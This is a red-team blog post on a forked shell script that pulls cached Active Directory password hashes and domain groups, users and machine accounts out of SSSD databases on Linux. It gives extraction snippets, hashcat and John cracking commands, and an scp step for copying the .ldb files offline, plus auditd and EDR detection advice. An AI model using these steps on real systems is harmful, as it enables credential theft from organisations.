---
title: "SSSD-Extract: Dumping AD Hashes and Domain Info from Linux Systems"
date: 2023-08-20
lastmod: 2025-06-13
description: "How to extract cached Active Directory credentials, group memberships, user accounts and machine accounts from SSSD on domain-joined Linux systems. Includes extended fork with domain enumeration added during OSEP preparation."
categories: [research, tools, red-team]
tags: [sssd, active-directory, post-exploitation, linux, credential-dumping, ntlm, osep]
author: z-r0crypt
featured: true
draft: false
summary: "Extract cached AD hashes and enumerate domain groups, users and machine accounts from SSSD on domain-joined Linux. Extended fork of ricardojoserf/SSSD-creds with domain enumeration added during OSEP exam preparation."
---

## Background

During OSEP (PEN-300) exam preparation I encountered a scenario involving a domain-joined Linux system running SSSD with credential caching enabled. The original tool by [ricardojoserf](https://github.com/ricardojoserf/SSSD-creds) extracted cached password hashes but stopped there. During the exam I needed more — specifically domain group memberships, user accounts, and machine accounts cached in the same SSSD database.

This post documents how SSSD credential caching works, what the extended script extracts, and how to use it during post-exploitation on domain-joined Linux systems.

---

## How SSSD Credential Caching Works

SSSD (System Security Services Daemon) is used on Linux systems joined to an Active Directory domain. When a domain user logs in, SSSD caches their credentials locally in `/var/lib/sss/db/` so authentication still works if the DC is unreachable.

These cached credentials are stored in `.ldb` files (LDAP Database format). When parsed with `tdbdump`, they reveal:

- **Cached password hashes** — SHA-512 crypt format (`$6$...`), crackable with Hashcat or John
- **Domain group memberships** — all AD groups cached on this system
- **User accounts** — domain users who have authenticated on this machine
- **Machine accounts** — computer objects cached in the database

The key file is typically at:

```
/var/lib/sss/db/cache_<domain>.ldb
```

---

## What This Fork Adds

The original `analyze.sh` by ricardojoserf extracts cached password hashes only (35 lines). This fork extends it to also enumerate domain information cached in the same database:

| Feature | Original | This fork |
|---|---|---|
| Cached password hashes | ✅ | ✅ |
| Null byte stripping from hashes | ❌ | ✅ |
| Domain group enumeration | ❌ | ✅ |
| User account enumeration | ❌ | ✅ |
| Machine account enumeration | ❌ | ✅ |
| Output saved to `$location_/` | ❌ | ✅ |

---

## Requirements

- Root access on the target Linux system
- SSSD installed and configured to join an AD domain
- `tdbdump` installed (`apt install tdb-tools`) — if not available, the script falls back to listing the `.ldb` files for manual exfiltration

Tested on: Ubuntu 18.04+, RHEL 7/8, CentOS 7/8

---

## Usage

```bash
# Default path (/var/lib/sss/db/)
zsh sssd-extract.sh

# Custom path (useful when analysing exfiltrated files offline)
zsh sssd-extract.sh /path/to/ldb/files/
```

**Output files:**
- `hashes.txt` — extracted hashes in `username:hash` format, ready for cracking
- `domain.txt` — enumerated groups, users, and machine accounts

---

## Script Walkthrough

The script handles two scenarios depending on whether `tdbdump` is available on the target.

**Step 1 — Locate the database:**

```bash
if [ -z $1 ]; then
    location_=/var/lib/sss/db
else
    location_="$1"
fi
```

Defaults to `/var/lib/sss/db/` but accepts a custom path — useful for offline analysis after exfiltrating the `.ldb` files.

**Step 2 — Extract cached hashes:**

```bash
hash_=$(tdbdump $db_ | grep cachedPassword | grep $account_ \
    | grep -o "\$6\$.*achedPassword" \
    | awk -F 'Type' '{print $1}' \
    | awk -F 'cachedPassword' '{print $1}' \
    | awk -F 'lastCachedPassword' '{print $1}' \
    | tr -d '\\0')
```

The `| tr -d '\\0'` at the end strips null bytes from the output — a fix not present in the original that caused garbled hash output on some systems.

**Step 3 — Enumerate domain objects:**

The fork then enumerates three additional object types from the same database:

```bash
# Groups
tdbdump $db_ | grep "CN=GROUPS" | grep "DN=NAME" \
    | awk -F '=' '{print $4}' | awk -F ',' '{print $1}'

# Users (excluding machine accounts)
tdbdump $db_ | grep "CN=USERS" | grep "DN=NAME" \
    | awk -F '=' '{print $4}' | awk -F ',' '{print $1}' | grep -v '\$'

# Machine accounts
tdbdump $db_ | grep "CN=USERS" | grep "DN=NAME" \
    | awk -F '=' '{print $4}' | awk -F ',' '{print $1}' | grep '\$'
```

Machine accounts are distinguished from user accounts by the trailing `$` in their name — standard AD naming convention.

---

## Cracking the Hashes

SSSD cached credentials use SHA-512 crypt (`$6$` prefix, Hashcat mode 1800):

```bash
# John the Ripper
john hashes.txt --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt

# Hashcat
hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## Offline Analysis

If `tdbdump` is not available on the target, exfiltrate the `.ldb` files and analyse on your attacking machine:

```bash
# On target — locate the files
ls /var/lib/sss/db/*.ldb

# Transfer to attacking machine
scp target:/var/lib/sss/db/cache_domain.ldb .

# Install tdbdump and run offline
apt install tdb-tools
zsh sssd-extract.sh /path/to/exfiltrated/
```

This is the recommended approach during engagements — running `tdbdump` on the target leaves process traces.

---

## Detection

Blue team perspective — this technique leaves the following traces:

- `tdbdump` process execution visible in EDR telemetry
- File reads from `/var/lib/sss/db/` — detectable via `auditd` if configured with `-w /var/lib/sss/db/ -p r`
- Output files `hashes.txt` and `domain.txt` created in the SSSD directory
- Script execution as root — any SIEM rule watching for root shell spawning will catch this

**Defensive recommendation:** audit rule on `/var/lib/sss/db/` reads, and alert on `tdbdump` execution by any user other than `sssd`.

---

## GitHub

**[z-r0crypt/SSSD-extract](https://github.com/z-r0crypt/SSSD-extract)**

### Credit

Original tool by [ricardojoserf/SSSD-creds](#). Extended with domain enumeration and null byte fix during OSEP preparation.